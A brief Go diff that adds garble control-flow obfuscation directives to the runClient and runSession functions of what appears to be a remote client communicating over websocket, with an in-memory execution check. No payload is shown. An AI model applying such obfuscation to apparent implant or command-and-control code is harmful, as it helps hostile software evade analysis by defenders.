@@ -51,6 +51,7 @@ func isRunningInMemory() bool {
 }
 
 func runClient(cfg config.Config) {
+	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	baseBackoff := computeBaseBackoff()
 	backoff := baseBackoff
 	log.Printf("runtime GOOS=%s GOARCH=%s cfg.OS=%s cfg.Arch=%s", runtime.GOOS, runtime.GOARCH, cfg.OS, cfg.Arch)
@@ -518,6 +519,7 @@ func truncateStr(s string, n int) string {
 }
 
 func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.Conn, cfg config.Config) (err error) {
+	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	defer func() {
 		if r := recover(); r != nil {
 			reason := fmt.Sprintf("session panic: %v", r)
